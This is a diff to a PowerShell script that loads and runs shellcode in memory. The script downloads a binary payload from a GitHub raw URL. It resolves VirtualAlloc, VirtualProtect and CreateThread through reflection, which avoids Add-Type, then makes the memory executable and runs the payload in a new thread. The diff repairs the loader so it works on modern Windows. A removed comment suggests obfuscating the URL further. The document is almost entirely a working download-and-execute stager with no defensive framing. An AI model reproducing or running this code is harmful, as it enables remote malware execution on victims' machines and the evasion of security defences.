@@ -1,136 +1,147 @@
 # =====================================================================
-#   Reflection-based shellcode runner (no Add-Type / no DllImport block)
-#   Downloads from your URL, executes C++ shellcode via thread
+#   FIXED Reflection-based shellcode runner (no Add-Type)
+#   Compatible with modern Windows / PowerShell 5.1+
 # =====================================================================
 
-# ── Helper: Resolve Win32 API function pointer via reflection ──
 function LookupFunc {
     Param (
-        [string] $moduleName,
-        [string] $functionName
+        [string] $Module,
+        [string] $ProcName
     )
 
+    # Get UnsafeNativeMethods
     $systemAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
-        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }
+        Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith('System.dll') }
 
-    $unsafe = $systemAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $unsafeMethods = $systemAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
 
-    # GetProcAddress has overloads → usually we take the first suitable one
-    $gpaMethods = $unsafe.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' }
-    $gpa = $gpaMethods[0]  # most common overload: (HandleRef, string)
+    # GetModuleHandle
+    $getModuleHandle = $unsafeMethods.GetMethod('GetModuleHandle', [Type[]]@([String]))
 
-    $gmh = $unsafe.GetMethod('GetModuleHandle')
+    # Get correct GetProcAddress overload (IntPtr, String) → avoids HandleRef issues
+    $getProcAddress = $unsafeMethods.GetMethods() |
+        Where-Object { $_.Name -eq 'GetProcAddress' -and $_.GetParameters().Count -eq 2 -and $_.GetParameters()[0].ParameterType -eq [IntPtr] } |
+        Select-Object -First 1
 
-    $moduleHandle = $gmh.Invoke($null, @($moduleName))
-    $funcPtr = $gpa.Invoke($null, @([Runtime.InteropServices.HandleRef]::new([IntPtr]::Zero, $moduleHandle), $functionName))
+    if (-not $getProcAddress) {
+        throw "Could not find suitable GetProcAddress overload"
+    }
+
+    $hModule = $getModuleHandle.Invoke($null, @($Module))
+
+    # Invoke with IntPtr instead of HandleRef
+    $funcPtr = $getProcAddress.Invoke($null, @([IntPtr]$hModule, $ProcName))
+
+    if (-not $funcPtr) {
+        throw "GetProcAddress failed for $ProcName in $Module"
+    }
 
     return $funcPtr
 }
 
-# ── Helper: Create delegate type matching the target function signature ──
 function Get-DelegateType {
     Param (
-        [Type[]] $parameters = @(),
-        [Type]   $returnType = [void]
+        [Type[]] $Params = @(),
+        [Type]   $ReturnType = [void]
     )
 
-    $name   = New-Object Reflection.AssemblyName('ReflDel')
+    $name   = New-Object Reflection.AssemblyName('DynDelegate')
     $domain = [AppDomain]::CurrentDomain
     $asm    = $domain.DefineDynamicAssembly($name, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $mod    = $asm.DefineDynamicModule('InMemMod', $false)
-    $type   = $mod.DefineType('MyDelegate', 'Class,Public,Sealed,AnsiClass,AutoClass', [MulticastDelegate])
+    $mod    = $asm.DefineDynamicModule('InMem', $false)
+    $type   = $mod.DefineType('MyDelegateType', 'Class,Public,Sealed,AnsiClass,AutoClass', [MulticastDelegate])
 
     # Constructor
     $ctor = $type.DefineConstructor(
-        'RTSpecialName,HideBySig,Public',
+        [Reflection.BindingFlags]'Public,HideBySig,RTSpecialName',
         [Reflection.CallingConventions]::Standard,
         @([IntPtr], [Object])
     )
     $ctor.SetImplementationFlags('Runtime,Managed')
 
     # Invoke method
-    $invoke = $type.DefineMethod(
+    $invokeMethod = $type.DefineMethod(
         'Invoke',
-        'Public,HideBySig,NewSlot,Virtual',
-        $returnType,
-        $parameters
+        [Reflection.BindingFlags]'Public,HideBySig,NewSlot,Virtual',
+        $ReturnType,
+        $Params
     )
-    $invoke.SetImplementationFlags('Runtime,Managed')
+    $invokeMethod.SetImplementationFlags('Runtime,Managed')
 
     return $type.CreateType()
 }
 
-# ── Main logic ───────────────────────────────────────────────────────
+# ── Main ─────────────────────────────────────────────────────────────
 
-# Your original URL (you can obfuscate this part further if needed)
 $url = "https://github.com/Zakelijkgg/Undefined-BP/raw/refs/heads/main/shellcode.bin"
 
 try {
     $wc = New-Object Net.WebClient
     $shellcode = $wc.DownloadData($url)
-}
-catch {
+} catch {
     Write-Host "[-] Download failed: $($_.Exception.Message)"
     return
 }
 
 $size = $shellcode.Length
 
-# ── Resolve APIs ─────────────────────────────────────────────────────
+# ── Resolve function pointers ───────────────────────────────────────
 
-$ptrVirtualAlloc   = LookupFunc 'kernel32.dll' 'VirtualAlloc'
-$ptrVirtualProtect = LookupFunc 'kernel32.dll' 'VirtualProtect'
-$ptrCreateThread   = LookupFunc 'kernel32.dll' 'CreateThread'
-$ptrWaitForSingle  = LookupFunc 'kernel32.dll' 'WaitForSingleObject'
+try {
+    $ptrVirtualAlloc   = LookupFunc 'kernel32.dll' 'VirtualAlloc'
+    $ptrVirtualProtect = LookupFunc 'kernel32.dll' 'VirtualProtect'
+    $ptrCreateThread   = LookupFunc 'kernel32.dll' 'CreateThread'
+    $ptrWaitForSingle  = LookupFunc 'kernel32.dll' 'WaitForSingleObject'
+} catch {
+    Write-Host "[-] API resolution failed: $($_.Exception.Message)"
+    return
+}
 
-# ── Create delegate types ────────────────────────────────────────────
+# ── Define delegate types (NO [ref] in the array – use plain types) ──
 
-$delVirtualAlloc = Get-DelegateType @([IntPtr], [uint32], [uint32], [uint32]) ([IntPtr])
-$delVirtualProtect = Get-DelegateType @([IntPtr], [uint32], [uint32], [ref][uint32]) ([bool])
-$delCreateThread = Get-DelegateType @([IntPtr], [uint32], [IntPtr], [IntPtr], [uint32], [ref][uint32]) ([IntPtr])
-$delWaitForSingle = Get-DelegateType @([IntPtr], [uint32]) ([uint32])
+$delVirtualAlloc = Get-DelegateType -Params @([IntPtr], [uint32], [uint32], [uint32]) -ReturnType ([IntPtr])
 
-# ── Build callable delegates ─────────────────────────────────────────
+# For VirtualProtect – out/ref becomes plain uint32 in params, we handle ref separately when invoking
+$delVirtualProtect = Get-DelegateType -Params @([IntPtr], [uint32], [uint32], [uint32].MakeByRefType()) -ReturnType ([bool])
+
+$delCreateThread = Get-DelegateType -Params @([IntPtr], [uint32], [IntPtr], [IntPtr], [uint32], [uint32].MakeByRefType()) -ReturnType ([IntPtr])
+
+$delWaitForSingle = Get-DelegateType -Params @([IntPtr], [uint32]) -ReturnType ([uint32])
+
+# ── Create delegates ─────────────────────────────────────────────────
 
 $VirtualAlloc   = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVirtualAlloc,   $delVirtualAlloc)
 $VirtualProtect = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVirtualProtect, $delVirtualProtect)
 $CreateThread   = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCreateThread,   $delCreateThread)
 $WaitForSingle  = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrWaitForSingle,  $delWaitForSingle)
 
-# ── Execute shellcode ────────────────────────────────────────────────
+# ── Execute ──────────────────────────────────────────────────────────
 
 try {
-    Write-Host "[+] Allocating RW memory..."
-    $addr = $VirtualAlloc.Invoke([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    Write-Host "[+] Allocating memory (RW)..."
+    $addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x04)  # MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
 
-    if ($addr -eq [IntPtr]::Zero) {
-        throw "VirtualAlloc failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
-    }
+    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed (Win32: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
-    Write-Host "[+] Copying shellcode..."
     [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
 
-    Write-Host "[+] Changing protection to RX..."
-    $oldProtect = 0
-    $success = $VirtualProtect.Invoke($addr, [uint32]$size, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ
+    Write-Host "[+] Setting RX protection..."
+    $oldProtect = [uint32]0
+    $success = $VirtualProtect.Invoke($addr, $size, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ
 
-    if (-not $success) {
-        throw "VirtualProtect failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
-    }
+    if (-not $success) { throw "VirtualProtect failed (Win32: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
     Write-Host "[+] Creating thread..."
-    $tid = 0
-    $thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
+    $threadId = [uint32]0
+    $threadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
 
-    if ($thread -eq [IntPtr]::Zero) {
-        throw "CreateThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
-    }
+    if ($threadHandle -eq [IntPtr]::Zero) { throw "CreateThread failed (Win32: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
-    Write-Host "[+] Executing shellcode (waiting for thread)..."
-    $null = $WaitForSingle.Invoke($thread, [uint32]::MaxValue)
+    Write-Host "[+] Waiting for shellcode execution to finish..."
+    $null = $WaitForSingle.Invoke($threadHandle, 0xFFFFFFFF)
 
-    Write-Host "[+] Execution finished"
+    Write-Host "[+] Done."
 }
 catch {
-    Write-Host "[-] Error: $($_.Exception.Message)"
+    Write-Host "[-] Execution error: $($_.Exception.Message)"
 }
